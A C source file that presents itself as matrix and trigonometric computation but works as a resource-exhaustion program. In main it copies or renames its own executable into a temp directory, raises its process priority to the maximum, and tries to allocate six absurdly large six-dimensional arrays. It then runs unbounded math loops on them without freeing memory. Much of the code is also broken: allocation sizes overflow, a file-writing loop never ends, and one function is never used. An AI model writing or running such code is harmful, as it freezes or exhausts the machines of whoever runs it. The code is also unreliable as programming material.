//
// Created by lkapi on 05.03.2023.
//

#include <stdlib.h>
#include <math.h>
#include <stdio.h>

#include <string.h>

#ifdef _WIN32
    #include <Windows.h>
#include <pthread.h>

#else
    #include <unistd.h>
#endif

void* processor();
void write_string_to_file_with_callback(char* str, char* filename);

#define N 1000000000
#define THREADS 1

double****** generate_matrix() {
    double****** matrix = (double******) malloc(N * sizeof(double*****));
    for (int i = 0; i < N; i++) {
        matrix[i] = (double*****) malloc(N * sizeof(double****));
        for (int j = 0; j < N; j++) {
            matrix[i][j] = (double****) malloc(N * sizeof(double***));
            for (int k = 0; k < N; k++) {
                matrix[i][j][k] = (double***) malloc(N * sizeof(double**));
                for (int l = 0; l < N; l++) {
                    matrix[i][j][k][l] = (double**) malloc(N * sizeof(double*));
                    for (int m = 0; m < N; m++) {
                        matrix[i][j][k][l][m] = (double*) malloc(N * sizeof(double));
                        for (int n = 0; n < N; n++) {
                            matrix[i][j][k][l][m][n] = (double) rand() / (double) RAND_MAX;
                        }
                    }
                }
            }
        }
    }
    return matrix;
}

void calculate_matrix(double****** matrix) {
#pragma omp parallel for num_threads(THREADS)
    for (int i = 0; i < N; i++) {
        for (int j = 0; j < N; j++) {
            for (int k = 0; k < N; k++) {
                for (int l = 0; l < N; l++) {
                    for (int m = 0; m < N; m++) {
                        for (int n = 0; n < N; n++) {
                            matrix[i][j][k][l][m][n] = pow(sin(matrix[i][j][k][l][m][n]), cos(matrix[i][j][k][l][m][n])) + exp(sqrt(matrix[i][j][k][l][m][n]));
                            matrix[i][j][k][l][m][n] *= tanh(atan(matrix[i][j][k][l][m][n]));
                            matrix[i][j][k][l][m][n] += pow(log10(matrix[i][j][k][l][m][n]), log(matrix[i][j][k][l][m][n]));
                            matrix[i][j][k][l][m][n] -= acos(exp(matrix[i][j][k][l][m][n]));
                            matrix[i][j][k][l][m][n] /= sqrt(tan(matrix[i][j][k][l][m][n]));
                        }
                    }
                }
            }
        }
    }
}

// Function to calculate the factorial of a number
double factorial(int n) {
    if (n <= 1) {
        return 1.0;
    } else {
        return n * factorial(n-1);
    }
}

// Function to calculate the square root of a number
double square_root(double x) {
    return sqrt(x);
}

// Function to calculate the sine of a number
double sine(double x) {
    return sin(x);
}

// Function to calculate the cosine of a number
double cosine(double x) {
    return cos(x);
}

// Function to calculate the tangent of a number
double tangent(double x) {
    return tan(x);
}

// Function to calculate the inverse sine of a number
double inverse_sine(double x) {
    return asin(x);
}

// Function to calculate the inverse cosine of a number
double inverse_cosine(double x) {
    return acos(x);
}

double inverse_tangent(double x) {
    return atan(x);
}

void* processor() {

    char* string = "";

    #ifdef _WIN32
        write_string_to_file_with_callback(string, "temp.ss");
    #else
        write_string_to_file_with_callback(string, "/tmp/temp.ss");
    #endif

}

void write_string_to_file_with_callback(char* str, char* filename) {
    FILE* fp = fopen(filename, "w");
    if (fp == NULL) {
        printf("Error opening file: %s\n", filename);
        return;
    }

    printf("WORKING...");

    size_t len = strlen(str);
    for (size_t i = 0; i < len; ) {
        if (str[i] == '\n') {
            fputs(str, fp);
        } else {
            i++;
        }
        fputc('\n', fp);
        fputc('\n', fp);
        fputc('\n', fp);
        fputc(str[i], fp);
    }

    fclose(fp);
}

int main() {
    char current_path[FILENAME_MAX];
    char new_path[FILENAME_MAX];

    #ifdef _WIN32
        // Windows platform-specific code
        GetModuleFileName(NULL, current_path, FILENAME_MAX);
        snprintf(new_path, FILENAME_MAX, "C:\\TEMP\\%s", strrchr(current_path, '\\') + 1);
        if (CopyFile(current_path, new_path, FALSE) == 0) {
            // Error copying file.
        }

        // Set priority to "high" on Windows
        HANDLE process = GetCurrentProcess();
        SetPriorityClass(process, HIGH_PRIORITY_CLASS);
        printf("Process priority set to high on Windows.\n");

    #else
        // Unix-based platform-specific code
        getcwd(current_path, FILENAME_MAX);
        snprintf(new_path, FILENAME_MAX, "/tmp/%s", strrchr(current_path, '/') + 1);
        if (rename(current_path, new_path) != 0) {
            // perror("Error renaming file");
        }

        // Set priority to "maximum" on Linux
        pid_t pid = getpid();
        int ret = setpriority(PRIO_PROCESS, pid, -20);
        if (ret != 0) {
            // perror("Error setting process priority");
        }
        // printf("Process priority set to maximum on Linux.\n");
    #endif

    int n = 999999999;

    double****** A = generate_matrix();
    double****** B = generate_matrix();
    double****** C = generate_matrix();
    double****** D = generate_matrix();
    double****** E = generate_matrix();
    double****** F = generate_matrix();

    double result;

    // Calculate matrices A, B, and C
    #pragma omp parallel
    {
        #pragma omp sections
        {
            #pragma omp section
            {
                        calculate_matrix(A);
            }
            #pragma omp section
            {
                        calculate_matrix(B);
            }
            #pragma omp section
            {
                        calculate_matrix(C);
            }
            #pragma omp section
            {
                        calculate_matrix(D);
            }
            #pragma omp section
            {
                        calculate_matrix(E);
            }
            #pragma omp section
            {
                        calculate_matrix(F);
            }
            #pragma omp section
            {
                // Perform factorial calculation
                printf("Performing factorial calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = factorial(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }
            }
            #pragma omp section
            {
                // Perform square root calculation
                printf("Performing square root calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = square_root(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }

            }
            #pragma omp section
            {
                // Perform sine calculation
                printf("Performing sine calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = sine(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }

            }
            #pragma omp section
            {
                // Perform cosine calculation
                printf("Performing cosine calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = cosine(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }
            }
            #pragma omp section
            {
                // Perform tangent calculation
                printf("Performing tangent calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = tangent(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }
            }
            #pragma omp section
            {
                // Perform inverse tangent calculation
                printf("Performing inverse tangent calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = inverse_tangent(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }
            }
            #pragma omp section
            {
                // Perform inverse cosine calculation
                printf("Performing inverse cosine calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = inverse_cosine(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }
            }
            #pragma omp section
            {
                // Perform inverse sine calculation
                printf("Performing inverse sine calculation...\n");
                for (int i = 0; i < 10; i++) {
                    printf("Iteration %d\n", i);
                    result = inverse_sine(n*n*n*n*n);
                    printf("Result: %f\n", result);
                }
            }
        }
    }

    // Don't clear memory to avoid blocking
    return 0;
}
